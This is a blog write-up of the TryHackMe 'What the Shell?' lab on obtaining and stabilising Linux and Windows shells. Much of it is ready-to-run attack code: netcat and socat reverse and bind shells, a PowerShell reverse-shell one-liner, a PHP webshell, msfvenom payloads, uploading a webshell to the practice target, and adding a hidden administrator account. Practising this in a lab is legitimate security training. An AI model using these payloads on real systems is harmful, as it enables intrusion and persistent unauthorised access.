---
title: Writeup for TryHackMe room - What the Shell?
author: 4n3i5v74
date: 2021-03-16 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, linux, shell]
pin: false
---

## [What the Shell?](https://tryhackme.com/room/introtoshells){:target="_blank"}

This room contains info about linux shells and methods to use them.


## Task 2 - Tools

Use these links as references.
- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md){:target="_blank"}
- [Reverse shell CheatSheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists){:target="_blank"}


Netcat does all kinds of network interactions, like banner grabbing during enumeration, but more importantly, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques. Exe version is available for windows machines.

Socat shells are similar to netcat, usually more stable than netcat shells out of the box. The syntax is more difficult, and Netcat is installed on linux by default. Exe version is available for windows machines.

Metasploit framework's auxiliary/multi/handler module is like socat and netcat. It provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads.

Msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. It can generate payloads other than reverse and bind shells.


## Task 3 - Types of Shell

Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.

Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.


## Task 5 - Shell Stabilisation

Use these links as references.
- [SOCAT linux binary without dependencies](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true){:target="_blank"}
- [SOCAT windows binary without dependencies](https://sourceforge.net/projects/unix-utils/files/socat/){:target="_blank"}

The following are the methods to use netcat reverse/bind shells.

### Method 1 - Python

Mainly for linux targets, as they have python installed by default.

Get the current terminal settings for row and column size using `stty -a`.

Spawn a shell listener using python.
{% capture code %}{% raw %}nc -lnvp <port>{% endraw %}{% endcapture %} {% include code.html code=code %}

On the target, use the following example to send the reverse shell.
{% capture code %}{% raw %}nc <local-ip> <local-port>{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `python` to spawn a `bash` shell.
{% capture code %}{% raw %}python -c 'import pty;pty.spawn("/bin/bash")'{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `TERM` settings to give access to few terminal commands like `clear.
{% capture code %}{% raw %}export TERM=xterm{% endraw %}{% endcapture %} {% include code.html code=code %}

Background the shell using `ctrl + z`. Set `echo` off in own terminal to pass the echo commands to the reverse/bind shell. This also provides access to tab autocomplete, arrow keys, and Ctrl + C to kill processes. Once done, foreground the process to bring the shell back.
{% capture code %}{% raw %}stty raw -echo; fg{% endraw %}{% endcapture %} {% include code.html code=code %}

Set the terminal row and column size as noted previously using below commands. This helps using editor commands without disrupting the output and shell scroll.
{% capture code %}{% raw %}stty rows <no>
stty cols <no>{% endraw %}{% endcapture %} {% include code.html code=code %}

Once the reverse/bind shell dies, input in own terminal will not be visible, as `echo` is turned off. Use `reset` to bring the settings to default.


### Method 2 - rlwrap

This method brings more stability to windows shells.

Install the package using `apt install rlwrap`.

Get the current terminal settings for row and column size using `stty -a`.

Use `rlwrap` along with `netcat` to create a slightly stabilised shell.
{% capture code %}{% raw %}rlwrap nc -lvnp <port>{% endraw %}{% endcapture %} {% include code.html code=code %}

Background the shell using `ctrl + z`. Set `echo` off in own terminal to pass the echo commands to the reverse/bind shell. This also provides access to tab autocomplete, arrow keys, and Ctrl + C to kill processes. Once done, foreground the process to bring the shell back.
{% capture code %}{% raw %}stty raw -echo; fg{% endraw %}{% endcapture %} {% include code.html code=code %}

Set the terminal row and column size as noted previously using below commands. This helps using editor commands without disrupting the output and shell scroll.
{% capture code %}{% raw %}stty rows <no>
stty cols <no>{% endraw %}{% endcapture %} {% include code.html code=code %}

Once the reverse/bind shell dies, input in own terminal will not be visible, as `echo` is turned off. Use `reset` to bring the settings to default.


### Method 3 - socat

This method is limited to linux targets.

Navigate to directory containing socat binary. Use `python` to create temporary web service to distribute the `socat` binary.
{% capture code %}{% raw %}python3 -m http.server 80{% endraw %}{% endcapture %} {% include code.html code=code %}

In the target machine, download the `socat` binary.

For linux targets, use command like below.
{% capture code %}{% raw %}wget <local-ip>/socat -O /tmp/socat{% endraw %}{% endcapture %} {% include code.html code=code %}

For windows targets, use command like below.
{% capture code %}{% raw %}invoke-webrequest -uri <local-ip>/socat.exe -outfile c:\\windows\temp\socat.exe{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 6 - Socat

Use these links as references.
- [SOCAT linux binary without dependencies](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true){:target="_blank"}
- [SOCAT windows binary without dependencies](https://sourceforge.net/projects/unix-utils/files/socat/){:target="_blank"}

Socat is as a connector between two points. This will essentially be a listening port and the keyboard, it could also be a listening port and a file, or two listening ports. Socat provides a link between two points.

An example listener command. Use `-d -d` to turn on debug mode.
{% capture code %}{% raw %}socat TCP:<target-ip>:<target-port> -{% endraw %}{% endcapture %} {% include code.html code=code %}


### Reverse shell

An example reverse shell for windows targets.
{% capture code %}{% raw %}socat TCP:<attacker-ip>:<attacker-port> EXEC:powershell.exe,pipes{% endraw %}{% endcapture %} {% include code.html code=code %}

An example reverse shell for linux targets.
{% capture code %}{% raw %}socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li"{% endraw %}{% endcapture %} {% include code.html code=code %}


### Bind shell

An example bind shell for windows targets.
{% capture code %}{% raw %}socat TCP-L:<port> EXEC:powershell.exe,pipes{% endraw %}{% endcapture %} {% include code.html code=code %}

An example bind shell for linux targets.
{% capture code %}{% raw %}socat TCP-L:<port> EXEC:"bash -li"{% endraw %}{% endcapture %} {% include code.html code=code %}


### Stabilising

An example to stabilise the `socat` shell listener from attaching machine.
{% capture code %}{% raw %}socat TCP-L:<port> FILE:`tty`,raw,echo=0{% endraw %}{% endcapture %} {% include code.html code=code %}

An example to stabilise the `socat` shell from linux target machine.
{% capture code %}{% raw %}socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane{% endraw %}{% endcapture %} {% include code.html code=code %}

From the above command, the description for options are as follows.
- pty - allocates a pseudoterminal on the target
- stderr - error messages shown in the shell
- sigint - passes Ctrl + C commands through sub-process, allowing us to kill commands inside the shell
- setsid - creates the process in a new session
- sane - stabilises the terminal


## Task 7 - Socat Encrypted Shells

To use encrypted communication, generate a certificate and key file. The inputs asked during generation can be given or left empty. Create `pem` file from the resulting `crt` and `key` file, for use in `socat`.
{% capture code %}{% raw %}openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem{% endraw %}{% endcapture %} {% include code.html code=code %}

An example of `reverse shell` implementation of `socat` is as below.
{% capture code %}{% raw %}socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -
socat OPENSSL:<local-ip>:<local-port>,verify=0 EXEC:/bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}

An example of `bind shell` implementation of `socat` is as below. `Bind shell` implementation requires the `pem` file to be present at the target.
{% capture code %}{% raw %}socat OPENSSL:<target-ip>:<target-port>,verify=0 -
socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes{% endraw %}{% endcapture %} {% include code.html code=code %}

An example syntax for openssl listener on port 53 with encrypt.pem file is as below.
{% capture code %}{% raw %}socat openssl-listen:53,cert=encrypt.pem,verify=0 FILE;`tty`,raw,echo=0{% endraw %}{% endcapture %} {% include code.html code=code %}

An example syntax for connecting to 10.10.10.5 back to listener is as below.
{% capture code %}{% raw %}socat openssl:10.10.10.5:53,verify=0 exec:"bash -li",pty,stderr,sigint,setsid,sane{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 8 - Common Shell Payloads

Use these links as references.
- [Named pipes](https://www.linuxjournal.com/article/2156){:target="_blank"}
- [PayloadAllTheThings Repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md){:target="_blank"}


Few versions of `netcat`, including ones in kali `netcat-traditional` and `/usr/share/windows-resources/binaries`, there is an option `-e` to specify process to be executed upon connection. This is not included in default versions of netcat as it is seen insecure.

The following example provides shell on target with `bash`. The first command provides `bind shell` and second command provides `reverse shell`
{% capture code %}{% raw %}nc -lvnp <port> -e /bin/bash
nc <local-ip> <port> -e /bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}

An alternate method to create reverse/bind shell listener with `bash` without using `-e` option of `netcat`.
{% capture code %}{% raw %}mkfifo /tmp/f; nc -lvnp <port> < /tmp/f | /bin/sh >/tmp/f 2>&1 ; rm /tmp/f
mkfifo /tmp/f; nc <local-ip> <port> < /tmp/f | /bin/sh >/tmp/f 2>&1 ; rm /tmp/f{% endraw %}{% endcapture %} {% include code.html code=code %}


### Powershell listener

The following is a one-liner to be used in `cmd` which invokes a `reverse shell` from target.
{% capture code %}{% raw %}powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 9 - msfvenom

Msfvenom is used to generate code for reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit. It can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py).

An example syntax to generate reverse shell.
{% capture code %}{% raw %}msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-ip> LPORT=<listen-port>{% endraw %}{% endcapture %} {% include code.html code=code %}

Types of payload
- `Staged payloads` are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the target. It connects back to a waiting listener, but doesn't actually contain any reverse shell code. It connects to the listener and downloads the actual payload. The payload is split into two parts - a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener, usually the Metasploit multi/handler.
- `Stageless payloads` are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable and have a lot of inbuilt functionality, such as file uploads and downloads. If any of Metasploit's post-exploitation tools are needed, then meterpreter shell should be used. The downside to meterpreter shells is that they must be caught in Metasploit.


### Payload naming conventions

The payloads are named in the convention, `<OS>/<arch>/<payload>`. `linux/x86/shell_reverse_tcp` constitute to `linux 32-bit` OS, `windows/shell_reverse_tcp` constitute to  `windows 32-bit` OS and `windows/x64/shell_reverse_tcp` constitute to `windows 64-bit` OS.

`shell_reverse_tcp` is a stageless payload where there is `_` after `shell` keyword, and `shell/reverse_tcp` is a  staged payload where there is `/` after `shell` keyword.

The following example is used to generate linux elf binary with staged reverse shell payload.
{% capture code %}{% raw %}msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443{% endraw %}{% endcapture %} {% include code.html code=code %}

To list available payloads, use the below.
{% capture code %}{% raw %}msfvenom --list payloads{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 10 - Metasploit multi/handler

Multi/Handler is a tool for catching reverse shells.

Use `msfconsole` to configure and spawn a `reverse shell`.
{% capture code %}{% raw %}msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

Name  Current Setting  Required  Description
----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port


Exploit target:

Id  Name
--  ----
0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST <ip>
LHOST => <ip>
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on <ip>:443{% endraw %}{% endcapture %} {% include code.html code=code %}


Once listener receives the connection, a session will be opened. Use `sessions` can be used to list sessions. Use `sessions <id>` to bring the session to foreground.


## Task 11 - WebShells

Use these links as references.
- [PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php){:target="_blank"}


Webshell is a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage either through a HTML form, or directly as arguments in the URL, which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell. Variety of web shells are available in /usr/share/webshells in kali linux.

An example for php webshell is as below.
{% capture code %}{% raw %}<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>{% endraw %}{% endcapture %} {% include code.html code=code %}

An example for powershell webshell is as below.
{% capture code %}{% raw %}powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 12 - Next Steps

Use these links as references.
- [Dirty COW (CVE-2016-5195) Privilege Escalation](https://dirtycow.ninja/){:target="_blank"}


On linux ideally there would be opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`. We would obtain a shell running as the `SYSTEM` user, or an `administrator` account running with high privileges. In such a situation it's possible to simply add own account (in the administrators group) to the machine, then log in over `RDP`, `telnet`, `winexe`, `psexec`, `WinRM` or any number of other methods, dependent on the services running on the box.

Once shell is obtained, the following sample commands can be used to add user with privileges.
{% capture code %}{% raw %}net user <username> <password> /add
net localgroup administrators <username> /add{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 13 - Practice and Examples

### Enumeration - Linux

Check the services running in the target.
{% capture code %}{% raw %}nmap -Pn -T4 -sS -F <ip>{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-13 04:44 BST
Nmap scan report for <hostname> (<ip>)
Host is up (0.0010s latency).
Not shown: 98 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:34:D3:9D:EB:4B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}


### Web shell upload - Linux

Copy the webshell available in `/usr/share/webshells/php/php-reverse-shell.php` and edit the file to modify `ip` and `port` of attacking machine.
{% capture code %}{% raw %}$ip = '<local-ip>';
$port = 443;{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `stty -a` to get the current terminal settings.
{% capture code %}{% raw %}speed 38400 baud; rows 34; columns 169; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk brkint ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc{% endraw %}{% endcapture %} {%include code.html code=code %}

Create a `netcat` listener in attacking machine.
{% capture code %}{% raw %}nc -lnvp 443{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, which mentions the listener is active.
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443){% endraw %}{% endcapture %} {%include code.html code=code %}

Use `firefox` to login to the url `http://<ip>`, browse the `php-reverse-shell.php` payload and submit. Access the url `http://<ip>/uploads/php-reverse-shell.php` to activate the `reverse shell`.

The `reverse shell` would have spawned at the netcat listener.
{% capture code %}{% raw %}Connection from <target-ip> 59564 received!
Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:00:56 up 50 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shell    pts/0    <ip>    04:25   20:16   0.07s  0.02s python3 -c import pty ; pty.spawn("/bin/bash")
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off{% endraw %}{% endcapture %} {%include code.html code=code %}

Use `python` to spawn `bash` shell. Background the `netcat` listener in attacking machine to sanitise the `reverse shell`.
{% capture code %}{% raw %}$ python3 -c 'import pty ; pty.spawn("/bin/bash")'
www-data@linux-shell-practice:/$ ^Z
[1]+  Stopped                 nc -lnvp 443{% endraw %}{% endcapture %} {%include code.html code=code %}

Turn off `echo` in shell and foreground it so the `reverse shell` in attacking machine can show the output properly inside `netcat` listener.
{% capture code %}{% raw %}stty raw -echo ; fg{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained. TTY rows and columns can also be set so `vim` or `nano` editor will be aligned according to shell resolution.
{% capture code %}{% raw %}nc -lnvp 443

www-data@linux-shell-practice:/$ ^C
www-data@linux-shell-practice:/$ stty rows 34
www-data@linux-shell-practice:/$ stty cols 169
www-data@linux-shell-practice:/$ exit{% endraw %}{% endcapture %} {%include code.html code=code %}


### Reverse Netcat Shell - Linux

Create a `netcat` listener in attacking machine.
{% capture code %}{% raw %}nc -lnvp 443{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, which mentions the listener is active.
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443){% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `reverse shell` from the target.
{% capture code %}{% raw %}mkfifo /tmp/f ; nc <local-ip> 443 </tmp/f | /bin/sh > /tmp/f 2>&1 ; rm -f /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}

The `reverse shell` in attacking machine would have spawned at the `netcat` listener. Use `python` to spawn `bash` shell. Background the `netcat` listener to sanitise the `reverse shell`.
{% capture code %}{% raw %}Connection from <target-ip> 59568 received!

python3 -c 'import pty ; pty.spawn("/bin/bash")'
shell@linux-shell-practice:~$ ^Z
[1]+  Stopped                 nc -lnvp 443{% endraw %}{% endcapture %} {%include code.html code=code %}

Turn off `echo` in `reverse shell` in attacking machine and foreground it so the `reverse shell` can show the output properly inside `netcat` listener.
{% capture code %}{% raw %}stty raw -echo ; fg{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained. TTY rows and columns can also be set so `vim` or `nano` editor will be aligned according to shell resolution.
{% capture code %}{% raw %}nc -lnvp 443

shell@linux-shell-practice:~$ export TERM=xterm
shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ {% endraw %}{% endcapture %} {%include code.html code=code %}


### Bind Netcat Shell - Linux

Create a `netcat` listener in attacking machine.
{% capture code %}{% raw %}nc -lvnp 4444 -e /bin/bash{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, which mentions the listener is active.
{% capture code %}{% raw %}listening on [any] 4444 ...{% endraw %}{% endcapture %} {%include code.html code=code %}

Use `stty -a` to get the current terminal settings.
{% capture code %}{% raw %}speed 38400 baud; rows 34; columns 169; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk brkint ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc{% endraw %}{% endcapture %} {%include code.html code=code %}

Create a `netcat` listener in target machine for `bind shell`.
{% capture code %}{% raw %}nc -nv <target-ip> 4444{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained, which mentions the listener is active.
{% capture code %}{% raw %}Connection to <target-ip> 4444 port [tcp/*] succeeded!{% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `bind shell` from the attacker.
{% capture code %}{% raw %}nc -lvnp 4444 -e /bin/bash{% endraw %}{% endcapture %} {%include code.html code=code %}

The `bind shell` in target machine would have spawned at the `netcat` initiator.
{% capture code %}{% raw %}connect to [<target-ip>] from (UNKNOWN) [<local-ip>] 53588{% endraw %}{% endcapture %} {%include code.html code=code %}

Use `python` to spawn `bash` shell. Background the `netcat` activator to sanitise the `bind shell`.
{% capture code %}{% raw %}python3 -c 'import pty ; pty.spawn("/bin/bash")'
shell@linux-shell-practice:~$ ^Z
[1]+  Stopped                 nc -nv <target-ip> 4444{% endraw %}{% endcapture %} {%include code.html code=code %}

Turn off `echo` in `reverse shell` in attacking machine and foreground it so the `reverse shell` can show the output properly inside `netcat` listener.
{% capture code %}{% raw %}stty raw -echo ; fg{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained. TTY rows and columns can also be set so `vim` or `nano` editor will be aligned according to shell resolution.
{% capture code %}{% raw %}nc -nv <target-ip> 4444
    shell@linux-shell-practice:~$ ^C
    shell@linux-shell-practice:~$ stty rows 34
    shell@linux-shell-practice:~$ stty cols 169
    shell@linux-shell-practice:~${% endraw %}{% endcapture %} {%include code.html code=code %}


### Reverse Socat Shell - Linux

`Socat` can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true){:target="_blank"} and windows is [here](https://sourceforge.net/projects/unix-utils/files/socat/){:target="_blank"}.

`Socat` shell is stabilised and sanitised by default and does not need additional configurations after gaining `shell`.

Create a `socat` listener in attacking machine.
{% capture code %}{% raw %}wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP-L:443 FILE:`tty`,raw,echo=0{% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `reverse shell` from the target.
{% capture code %}{% raw %}wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:<local-ip>:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained in `socat` listener.
{% capture code %}{% raw %}shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ exit
logout{% endraw %}{% endcapture %} {%include code.html code=code %}


### Bind Socat Shell - Linux

`Socat` can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true){:target="_blank"} and windows is [here](https://sourceforge.net/projects/unix-utils/files/socat/){:target="_blank"}.

`Socat` shell is stabilised and sanitised by default and does not need additional configurations after gaining `shell`.

Create a `socat` listener in target machine.
{% capture code %}{% raw %}wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP-L:4430 EXEC:"bash -li",pty,stderr,sigint,setsid,sane{% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `bind shell` from the attacker.
{% capture code %}{% raw %}wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:<target-ip>:4430 FILE:`tty`,raw,echo=0{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained in `socat` listener.
{% capture code %}{% raw %}shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ exit
logout{% endraw %}{% endcapture %} {%include code.html code=code %}


### Encrypted Socat Shell - Linux

`Socat` can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true){:target="_blank"} and windows is [here](https://sourceforge.net/projects/unix-utils/files/socat/){:target="_blank"}.

`Socat` shell is stabilised and sanitised by default and does not need additional configurations after gaining `shell`. The following is an example for `reverse shell`. For `bind shell`, the generated certificate should be copied to target machine before creating a listener.

Using `openssl`, create a self-signed `cert` and `key`.
{% capture code %}{% raw %}openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained. Default values can be accepted or set manually.
{% capture code %}{% raw %}Generating a RSA private key
writing new private key to 'shell.key'
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:{% endraw %}{% endcapture %} {%include code.html code=code %}

Create `pem` file from the generated `cert` and `key` files.
{% capture code %}{% raw %}cat shell.key shell.crt > shell.pem{% endraw %}{% endcapture %} {%include code.html code=code %}

Create an `encrypted socat` listener in attacking machine.
{% capture code %}{% raw %}wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0{% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `encrypted reverse shell` from the target.
{% capture code %}{% raw %}wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat OPENSSL:<local-ip>:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane{% endraw %}{% endcapture %} {%include code.html code=code %}

An output similar to below will be obtained in `encrypted socat` listener.
{% capture code %}{% raw %}shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ exit
logout{% endraw %}{% endcapture %} {%include code.html code=code %}


### Stageless Meterpreter Shell - Linux

Use `msfconsole` to create `multi/handler` and load the payload `linux/x64/shell_reverse_tcp`, which is `stageless`. The `exploit` is given in background, and hence sessions will not be loaded by default.
{% capture code %}{% raw %}msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST <local-ip>
LHOST => <local-ip>
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > set PAYLOAD linux/x64/shell_reverse_tcp
PAYLOAD => linux/x64/shell_reverse_tcp
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on <local-ip>:443 {% endraw %}{% endcapture %} {%include code.html code=code %}

Activate the `reverse shell` from the attacker.
{% capture code %}{% raw %}mkfifo /tmp/f ; nc -nv <local-ip> 443 < /tmp/f | /bin/sh > /tmp/f 2>&1 ; rm -rf /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}

